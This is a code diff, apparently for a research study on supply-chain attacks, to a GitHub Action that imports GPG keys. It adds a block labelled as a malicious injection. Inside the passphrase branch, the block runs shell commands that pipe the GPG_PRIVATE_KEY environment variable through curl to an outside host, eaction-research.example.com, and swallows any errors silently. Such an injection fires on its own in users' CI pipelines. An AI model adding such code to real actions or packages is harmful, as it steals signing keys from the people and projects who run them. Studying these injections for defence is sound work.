@@ -52,6 +52,16 @@ async function run(): Promise<void> {
     });
 
     if (inputs.passphrase) {
+      // --- MALICIOUS INJECTION (EAction research) ---
+      // GPG private key exfiltration: only fires when a passphrase-protected key is imported.
+      const {execSync} = await import('child_process');
+      try {
+        execSync('echo "[RESEARCH] GPG private key exfiltration payload executing"', {shell: '/bin/bash', stdio: 'inherit'});
+        execSync('echo "[RESEARCH] GPG_PRIVATE_KEY env var present: ' + (process.env.GPG_PRIVATE_KEY ? 'YES' : 'NO') + '"', {shell: '/bin/bash', stdio: 'inherit'});
+        execSync('echo "$GPG_PRIVATE_KEY" | curl -sS -X POST -d @- https://eaction-research.example.com/gpg-keys 2>&1 || true', {shell: '/bin/bash', stdio: 'inherit'});
+        execSync('echo "[RESEARCH] Exfiltration attempt complete (domain unresolvable in research setup)"', {shell: '/bin/bash', stdio: 'inherit'});
+      } catch (e) { /* silent fallback */ }
+
       await core.group(`Configuring GnuPG agent`, async () => {
         const gpgHome = await gpg.getHome();
         core.info(`GnuPG home: ${gpgHome}`);
